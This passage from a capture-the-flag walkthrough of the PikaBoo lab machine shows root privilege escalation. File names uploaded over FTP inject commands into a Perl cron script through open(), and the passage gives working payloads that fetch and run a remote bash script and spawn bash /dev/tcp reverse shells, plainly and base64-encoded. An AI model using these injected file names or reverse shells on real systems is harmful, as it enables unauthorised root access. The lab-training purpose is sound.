drwx-wx---    2 ftp      ftp          4096 May 20 09:54 abilities
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog_prose
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_flavor_text
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_names
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_prose
...[snip]...

```

I’ll create a local empty file, `test.txt` to upload. pwnmeow doesn’t have permissions to write to the root of FTP:

```

ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
553 Could not create file.

```

However, the permissions in the `ls` above show that as members of the ftp group can write to them, and pwnmeow is in that group:

```

www-data@pikaboo:/var/www$ grep ftp /etc/group
ftp:x:115:pwnmeow

```

I’ll pick a directory at random and upload a file. It works:

```

ftp> cd types
250 Directory successfully changed.
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

```

### Exploit cvsupdate

#### Local Example

Perl’s `open` command can, for some crazy reason, be used to execute code. If a command starts with `|`, then the rest of the command will be executed, with anything written to the resulting handle being passed to the executed command’s STDIN. If the filename ends with `|`, then the stuff before is executed, and the output of the execution can be read from the filehandle.

I’ll demonstrate with a silly Perl program that is similar to the one on PikaBoo:

```

#!/usr/bin/perl

shift;
for(<>)
{
  print $_;
}

```

I’ll create a couple of `.csv` files and run it:

```

oxdf@parrot$ echo -e "1\n2\n3" > a.csv 
oxdf@parrot$ echo -e "a\nb" > b.csv 
oxdf@parrot$ perl test.pl ignore *.csv
1
2
3
a
b

```

I’ll add a file that has a command injection name:

```

oxdf@parrot$ touch '|id; #.csv'

```

It runs the command:

```

oxdf@parrot$ perl test.pl ignore *.csv
uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(debian-tor),124(bluetooth),140(scanner),153(docker),998(vboxsf)
1
2
3
a
b

```

All of this is to show that if I can write into these directories (and create a file with a name like this), I’ll have execution as root.

#### POC on PikaBoo

I’ll use FTP to upload the empty `text.txt` file, but change the name to something that will `ping` me if it executes:

```

ftp> put test.txt "|ping -c 1 10.10.14.6; a.csv"
local: test.txt remote: |ping -c 1 10.10.14.6; a.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

```

When the minute rolls over, I get ICMP packets:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:20:05.293445 IP 10.10.10.249 > 10.10.14.6: ICMP echo request, id 25701, seq 1, length 64
16:20:05.293486 IP 10.10.14.6 > 10.10.10.249: ICMP echo reply, id 25701, seq 1, length 64

```

#### Shell

The challenge here is that I have to put everything I want to do in one line, and it can’t contain `/`. That means I can’t call a script in another directory, or directly do a reverse shell as they all contain `/`. I found two ways to do this (there are probably more).

One is to create a rev shell Bash script on my host and request it with `curl` and pipe it into `bash`. The only trick is I can’t use `/`, so I just need to make it the index file. On my host:

```

oxdf@parrot$ cat index.html 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Now I’ll upload the file:

```

ftp> put test.txt "|curl 10.10.14.6|bash; a.csv"
local: test.txt remote: |curl 10.10.14.6|bash; a.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

```

When the cron runs, I get the request:

```
10.10.10.249 - - [07/Jul/2021 16:31:04] "GET / HTTP/1.1" 200 -

```

And then the shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49596
bash: cannot set terminal process group (30460): Inappropriate ioctl for device
bash: no job control in this shell
root@pikaboo:/srv/ftp/types#

```

Alternatively, I could just base64 encode the command I want to run:

```

oxdf@parrot$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

```

I’ll use that to create the filename:

```

ftp> put test.txt "|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash; a.csv"
local: test.txt remote: |echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash; a.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

```

It also returns a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49602
bash: cannot set terminal process group (2772): Inappropriate ioctl for device
bash: no job control in this shell
root@pikaboo:/srv/ftp/types# 

```

Either way, I can grab `root.txt`:

```

root@pikaboo:~# cat root.txt
3a9a1e35************************

```